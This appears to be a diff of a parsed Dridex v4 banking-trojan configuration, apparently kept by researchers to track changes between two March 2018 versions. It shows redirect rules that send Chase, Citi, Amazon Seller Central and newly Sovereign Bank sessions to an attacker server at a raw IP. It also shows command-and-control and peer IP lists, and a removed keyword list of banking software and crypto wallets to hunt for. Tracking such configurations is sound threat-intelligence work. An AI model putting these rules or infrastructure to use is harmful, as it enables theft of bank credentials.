@@ -4,7 +4,7 @@
     ***            dridex v4 configuration                    ***    
     *************************************************************    
     botnetid:      3122    
-    cfg timestamp: 2018-03-28T12:04:49+00:00    
+    cfg timestamp: 2018-03-29T11:15:12+00:00    
     parsed by:     @viql    
         
     note: The dridex v4 config is delivered in binary format;    
@@ -21,22 +21,9 @@
 -->
 
 <settings>
-  <modules>
-    <module>
-      <sha256>840e204392d2183ec7198917f73c9765f79d4baa0a05721f1d9a41b8670a7608</sha256>
-      <sha1>dc8a5f69bc48c4475bc4a44e7eb0fd99a5a7a537</sha1>
-      <md5>2680cd66b98910d26bfd815d83ca330f</md5>
-      <timestamp>2017-05-12T19:19:16+00:00</timestamp>
-      <architecture>64</architecture>
-      <name>grabber</name>
-      <crc>0x4d38f016</crc>
-    </module>
-  </modules>
+  <modules/>
   <commands>
-    <cmd id="989550" type="15">
-      <fs>crealogix,multiversa,abacus,ebics,agro-office,cashcomm,softcrew,coconet,macrogram,mammut,omikron,multicash,quatersoft,alphasys,wineur,epsitec,myaccessweb,bellin,financesuite,moneta,softcash,trinity,financesuite,abrantix,starmoney,sfirm,migrosbank,migros bank,online banking,star money,multibit,bitgo,bither,blockchain,copay,msigna,armory,electrum,coinbase,magnr,keepkey,coinsbank,coolwallet,bitoex,xapo,changetip,coinapult,blocktrail,breadwallet,luxstack,airbitz,schildbach,ledger nano,mycelium,trezor,coinomi,bitcore</fs>
-    </cmd>
-    <cmd id="989551" type="22">
+    <cmd id="1078788" type="9">
       <fs/>
     </cmd>
   </commands>
@@ -471,6 +458,7 @@ qweqweqwe.send();
       <redirect name="amazon_sellerscentral_active_grabber" postfwd="1" socks="0" timeout="20" uri="https://178.33.109.227:443/520/dg_secema_HPn7vWwV530MSsjr/eventExtend.php" vnc="0">^https://sellercentral\.amazon\.com/ap/asdnaisufniasufniausnfasfn.js</redirect>
       <redirect name="chase_active_grabber" postfwd="1" socks="0" timeout="20" uri="https://178.33.109.227:443/520/dg_cheseba_HPn7vWwV530MSsjr/eventExtend.php" vnc="0">^https://(.+\.)?chase\.com/iseufseiufnesifn.js</redirect>
       <redirect name="citi_active_grabber" postfwd="1" socks="0" timeout="20" uri="https://178.33.109.227:443/520/dg_citiba_HPn7vWwV530MSsjr/eventExtend.php" vnc="0">^https://(.+\.)?citi\.com/niuvsnegiushgisudngkjsdbg.js</redirect>
+      <redirect name="irisoba_redirect" postfwd="1" socks="0" timeout="20" uri="https://178.33.109.227:443/520/irisoba_HPn7vWwV530MSsjr/" vnc="0">^https://iris\.sovereignbank\.com/wcmfd/wcmpw/</redirect>
     </redirects2>
     <redirects>
       <redirects onget="1" onpost="1" timeout="300" type="allow">^https://secure\.bankofamerica\.com/myaccounts/signin/signIn\.go</redirects>
@@ -496,7 +484,7 @@ qweqweqwe.send();
     <clickshots>
       <clickshot clicks="30" onget="1" onpost="1" type="allow" xrange="3000" yrange="2000">^https://(login|www)\.tranzact\.org/</clickshot>
     </clickshots>
-    <timestamp>2018-03-28T12:04:49+00:00</timestamp>
+    <timestamp>2018-03-29T11:15:12+00:00</timestamp>
   </config>
   <c2>
     <host>
@@ -504,4 +492,50 @@ qweqweqwe.send();
       <ip>178.62.232.185</ip>
     </host>
   </c2>
+  <supernodes>
+    <node>
+      <ip>104.34.220.68</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>50.251.187.217</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>172.249.88.69</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>81.254.168.177</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>212.237.42.204</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>193.251.189.134</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>66.65.47.220</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>37.153.92.6</ip>
+      <port>8443</port>
+    </node>
+    <node>
+      <ip>73.138.81.95</ip>
+      <port>443</port>
+    </node>
+    <node>
+      <ip>37.153.92.6</ip>
+      <port>444</port>
+    </node>
+    <node>
+      <ip>109.21.222.28</ip>
+      <port>443</port>
+    </node>
+  </supernodes>
 </settings>
